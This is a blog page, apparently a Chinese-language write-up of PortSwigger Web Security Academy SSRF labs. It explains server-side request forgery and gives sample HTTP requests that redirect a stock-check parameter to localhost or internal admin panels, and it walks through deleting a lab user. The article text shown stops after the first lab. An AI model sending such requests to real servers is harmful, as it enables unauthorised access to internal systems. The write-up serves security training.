@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>PortSwigger Web Security Academy SSRF | colind0pe&#39;s blog</title>
+  <meta name="keywords" content=" SSRF ">
+  <meta name="description" content="PortSwigger Web Security Academy SSRF | colind0pe&#39;s blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#49;&amp;#x33;&amp;#x37;&amp;#48;&amp;#x32;&amp;#x32;&amp;#x37;&amp;#57;&amp;#57;&amp;#x36;&amp;#64;&amp;#113;&amp;#113;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#109;">
+<meta property="og:type" content="website">
+<meta property="og:title" content="关于">
+<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:site_name" content="colind0pe&#39;s blog">
+<meta property="og:description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#49;&amp;#x33;&amp;#x37;&amp;#48;&amp;#x32;&amp;#x32;&amp;#x37;&amp;#57;&amp;#57;&amp;#x36;&amp;#64;&amp;#113;&amp;#113;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#109;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-25T12:19:50.097Z">
+<meta property="article:modified_time" content="2021-12-25T12:19:50.097Z">
+<meta property="article:author" content="colind0pe">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>colind0pe</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/colind0pe"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="twitter"
+               href="https://twitter.com/holen_chan_hl"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-twitter"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/ColinDope"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:1370227996@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(13)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="渗透测试">
+                        
+                        渗透测试
+                        <small>(11)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="内网渗透">
+                        
+                        内网渗透
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Web安全">
+                        
+                        Web安全
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="13">
+<input type="hidden" id="yelog_site_word_count" value="15.3k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>端口转发</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>域渗透</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>HackTheBox</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SSRF</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>VulnHhub</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>VulnHub</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="全部文章 Web安全 "
+           href="/2022/07/21/PortSwigger-Web-Security-Academy-SSRF/"
+           data-tag="SSRF"
+           data-author="" >
+            <span class="post-title" title="PortSwigger Web Security Academy SSRF">PortSwigger Web Security Academy SSRF</span>
+            <span class="post-date" title="2022-07-21 14:22:15">2022/07/21</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2022/04/08/HackTheBox-Altered/"
+           data-tag="HackTheBox"
+           data-author="" >
+            <span class="post-title" title="HackTheBox-Altered">HackTheBox-Altered</span>
+            <span class="post-date" title="2022-04-08 09:09:00">2022/04/08</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/12/25/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-2-redteam-lab-Writeup/"
+           data-tag="域渗透"
+           data-author="" >
+            <span class="post-title" title="渗透攻击红队域渗透靶场-2(redteam.lab)Writeup">渗透攻击红队域渗透靶场-2(redteam.lab)Writeup</span>
+            <span class="post-date" title="2021-12-25 20:25:57">2021/12/25</span>
+        </a>
+        
+        <a  class="全部文章 内网渗透 "
+           href="/2021/12/02/SSH%E8%BD%AC%E5%8F%91%E5%92%8Ciptables%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"
+           data-tag="端口转发"
+           data-author="" >
+            <span class="post-title" title="SSH转发和iptables端口转发">SSH转发和iptables端口转发</span>
+            <span class="post-date" title="2021-12-02 14:54:23">2021/12/02</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/11/01/ICA1-VulnHub-Walkthrough/"
+           data-tag="VulnHhub"
+           data-author="" >
+            <span class="post-title" title="ICA1 VulnHub Walkthrough">ICA1 VulnHub Walkthrough</span>
+            <span class="post-date" title="2021-11-01 14:35:38">2021/11/01</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/10/14/driftingblues4-VulnHub-Walkthrough/"
+           data-tag="VulnHub"
+           data-author="" >
+            <span class="post-title" title="driftingblues4 VulnHub Walkthrough">driftingblues4 VulnHub Walkthrough</span>
+            <span class="post-date" title="2021-10-14 15:49:32">2021/10/14</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/10/13/driftingblues3-VulnHub-Walkthrough/"
+           data-tag="VulnHub"
+           data-author="" >
+            <span class="post-title" title="driftingblues3 VulnHub Walkthrough">driftingblues3 VulnHub Walkthrough</span>
+            <span class="post-date" title="2021-10-13 17:09:41">2021/10/13</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/10/12/driftingblues2-VulnHub-Walkthrough/"
+           data-tag="VulnHub"
+           data-author="" >
+            <span class="post-title" title="driftingblues2 VulnHub Walkthrough">driftingblues2 VulnHub Walkthrough</span>
+            <span class="post-date" title="2021-10-12 16:31:08">2021/10/12</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/10/12/driftingblues-VulnHub-Walkthrough/"
+           data-tag="VulnHub"
+           data-author="" >
+            <span class="post-title" title="driftingblues VulnHub Walkthrough">driftingblues VulnHub Walkthrough</span>
+            <span class="post-date" title="2021-10-12 16:24:52">2021/10/12</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/08/18/HackTheBox-Shield/"
+           data-tag="HackTheBox"
+           data-author="" >
+            <span class="post-title" title="HackTheBox-Shield">HackTheBox-Shield</span>
+            <span class="post-date" title="2021-08-18 17:05:21">2021/08/18</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/08/02/HackTheBox-Oopsie/"
+           data-tag="HackTheBox"
+           data-author="" >
+            <span class="post-title" title="HackTheBox-Oopsie">HackTheBox-Oopsie</span>
+            <span class="post-date" title="2021-08-02 17:05:21">2021/08/02</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/07/13/HackTheBox-Archetype/"
+           data-tag="HackTheBox"
+           data-author="" >
+            <span class="post-title" title="HackTheBox-Archetype">HackTheBox-Archetype</span>
+            <span class="post-date" title="2021-07-13 17:05:21">2021/07/13</span>
+        </a>
+        
+        <a  class="全部文章 渗透测试 "
+           href="/2021/07/13/HackTheBox-Vaccine/"
+           data-tag="HackTheBox"
+           data-author="" >
+            <span class="post-title" title="HackTheBox-Vaccine">HackTheBox-Vaccine</span>
+            <span class="post-date" title="2021-07-13 17:05:21">2021/07/13</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-PortSwigger-Web-Security-Academy-SSRF" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">PortSwigger Web Security Academy SSRF</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Web安全">Web安全</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">SSRF</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2022-07-21 14:24:01'>2022-07-21 14:22</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:5.8k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E7%AE%80%E4%BB%8B"><span class="toc-text">SSRF简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-SSRF-%E6%94%BB%E5%87%BB"><span class="toc-text">常见的 SSRF 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%AC%E8%BA%AB%E7%9A%84SSRF%E6%94%BB%E5%87%BB"><span class="toc-text">针对服务器本身的SSRF攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E5%85%B6%E4%BB%96%E5%90%8E%E7%AB%AF%E7%B3%BB%E7%BB%9F%E7%9A%84-SSRF-%E6%94%BB%E5%87%BB"><span class="toc-text">针对其他后端系统的 SSRF 攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%ACSSRF"><span class="toc-text">针对本地服务器的基本SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80"><span class="toc-text">靶场地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AF%B4%E6%98%8E"><span class="toc-text">靶场说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-text">实验步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E5%85%B6%E4%BB%96%E5%90%8E%E7%AB%AF%E7%B3%BB%E7%BB%9F%E7%9A%84-SSRF-%E6%94%BB%E5%87%BB-1"><span class="toc-text">针对其他后端系统的 SSRF 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80-1"><span class="toc-text">靶场地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AF%B4%E6%98%8E-1"><span class="toc-text">靶场说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-SSRF-%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87"><span class="toc-text">常见的 SSRF 防御绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84SSRF%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E7%BB%95%E8%BF%87"><span class="toc-text">基于黑名单的SSRF防御措施绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80-2"><span class="toc-text">靶场地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AF%B4%E6%98%8E-2"><span class="toc-text">靶场说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-2"><span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84-SSRF%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-text">基于白名单的 SSRF防御措施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80-3"><span class="toc-text">靶场地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AF%B4%E6%98%8E-3"><span class="toc-text">靶场说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF"><span class="toc-text">实验思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E7%9A%84-SSRF%E9%98%B2%E5%BE%A1"><span class="toc-text">通过开放重定向漏洞绕过的 SSRF防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80-4"><span class="toc-text">靶场地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AF%B4%E6%98%8E-4"><span class="toc-text">靶场说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF-1"><span class="toc-text">实验思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2-SSRF-%E6%BC%8F%E6%B4%9E"><span class="toc-text">盲 SSRF 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%9B%B2-SSRF%EF%BC%9F"><span class="toc-text">什么是盲 SSRF？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2-SSRF-%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BD%B1%E5%93%8D%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">盲 SSRF 漏洞的影响是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E7%9B%B2-SSRF-%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现和利用盲 SSRF 漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%A3%80%E6%B5%8B%E7%9A%84%E7%9B%B2SSRF"><span class="toc-text">带外检测的盲SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80-5"><span class="toc-text">靶场地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AF%B4%E6%98%8E-5"><span class="toc-text">靶场说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-3"><span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Shellshock-%E5%88%A9%E7%94%A8%E7%9B%B2SSRF"><span class="toc-text">使用 Shellshock 利用盲SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80-6"><span class="toc-text">靶场地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AF%B4%E6%98%8E-6"><span class="toc-text">靶场说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-4"><span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA-SSRF-%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE%E9%9A%90%E8%97%8F%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-text">为 SSRF 漏洞寻找隐藏的攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E4%B8%AD%E7%9A%84%E9%83%A8%E5%88%86-URL"><span class="toc-text">请求中的部分 URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E4%B8%AD%E7%9A%84-URL"><span class="toc-text">数据格式中的 URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Referer%E5%A4%B4%E7%9A%84SSRF"><span class="toc-text">通过Referer头的SSRF</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p><strong>SSRF</strong>（Server-Side Request Forgery，服务器端请求伪造），漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。因此存在SSRF漏洞的服务器通常被作为跳板机来取得外网或内网其它应用服务器的信息。</p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
+<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
+<h2 id="常见的-SSRF-攻击"><a href="#常见的-SSRF-攻击" class="headerlink" title="常见的 SSRF 攻击"></a>常见的 SSRF 攻击</h2><p><strong>SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。</strong>这些信任关系可能与服务器本身有关，也可能与同一组织内的其他后端系统有关。</p>
+<h3 id="针对服务器本身的SSRF攻击"><a href="#针对服务器本身的SSRF攻击" class="headerlink" title="针对服务器本身的SSRF攻击"></a>针对服务器本身的SSRF攻击</h3><p>在针对服务器本身的 SSRF 攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如<code>127.0.0.1</code>（指向环回适配器的保留 IP 地址）或<code>localhost</code>（同一适配器的常用名称）。</p>
+<p>例如，考虑一个购物应用程序，它允许用户查看某项商品是否在特定商店中有库存。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：</p>
+<pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+</code></pre>
+<p>这会导致服务器向指定的 URL 发出请求，检索库存状态并将其返回给用户。</p>
+<p>在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：</p>
+<pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://localhost/admin
+</code></pre>
+<p>在这里，服务器将获取<code>/admin</code>URL 的内容并将其返回给用户。</p>
+<p>当然，攻击者可以直接访问<code>/admin</code>URL。但管理功能通常只有经过身份验证的合适用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。但是，当对<code>/admin</code>URL 的请求来自本地机器本身时，会绕过正常的<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/access-control">访问控制。</a>应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。</p>
+<h3 id="针对其他后端系统的-SSRF-攻击"><a href="#针对其他后端系统的-SSRF-攻击" class="headerlink" title="针对其他后端系统的 SSRF 攻击"></a>针对其他后端系统的 SSRF 攻击</h3><p>服务器端请求伪造经常出现的另一种类型的信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。</p>
+<p>在前面的示例中，假设后端 URL 有一个管理界面<code> https://192.168.0.68/admin</code>。在这里，攻击者可以通过提交以下请求，利用 SSRF 漏洞访问管理界面：</p>
+<pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://192.168.0.68/admin
+</code></pre>
+<h2 id="针对本地服务器的基本SSRF"><a href="#针对本地服务器的基本SSRF" class="headerlink" title="针对本地服务器的基本SSRF"></a>针对本地服务器的基本SSRF</h2><h3 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">web-security/ssrf/lab-basic-ssrf-against-localhost</a></p>
+<h3 id="靶场说明"><a href="#靶场说明" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>
+<p>要完成这个实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、浏览<code>/admin</code>并观察您无法直接访问管理页面。</p>
+<p><img src="https://s2.loli.net/2022/07/20/6pzPSZRtXUT81AO.png"></p>
+<p>2、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>
+<p><img src="https://s2.loli.net/2022/07/20/PR3dI6cXVeOJsQo.png"></p>
+<p><img src="https://s2.loli.net/2022/07/20/Nu3VzDg9avWqXj2.png"></p>
+<p>3、将``stockApi<code>参数中 的 URL 更改为</code><a target="_blank" rel="noopener" href="http://localhost/admin%60%E3%80%82%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E5%8C%85%E5%90%8E%E8%83%BD%E7%9C%8B%E5%88%B0%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E3%80%82">http://localhost/admin`。发送请求包后能看到管理界面。</a></p>
+<p><img src="https://s2.loli.net/2022/07/20/v6cwAsStLm4yDRO.png"></p>
+<p>4、读取HTML识别删除目标用户的URL，即：<code>http://localhost/admin/delete?username=carlos</code></p>
+<p><img src="https://s2.loli.net/2022/07/20/Ypk2GVzy71fKm4E.png"></p>
+<p>5、成功删除carlos用户。</p>
+<p><img src="https://s2.loli.net/2022/07/20/oWeSXncfQGgdxbu.png"></p>
+<p><img src="https://s2.loli.net/2022/07/20/SAGZUvFY41kD2OX.png"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>为什么应用程序会以这种方式运行，并且缺省信任来自本地计算机的请求？这可能由于各种原因而出现：</p>
+<ul>
+<li>访问控制检查可能在位于应用程序服务器前面的不同组件中实现。 <strong>当与服务器本身建立连接时，会绕过检查。</strong></li>
+<li>出于灾难恢复的目的，<strong>应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问</strong>。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户会直接来自服务器本身。</li>
+<li>管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。</li>
+</ul>
+<p>这种信任关系（来自本地机器的请求的处理方式与普通请求不同）通常是使 SSRF 成为严重漏洞的原因。</p>
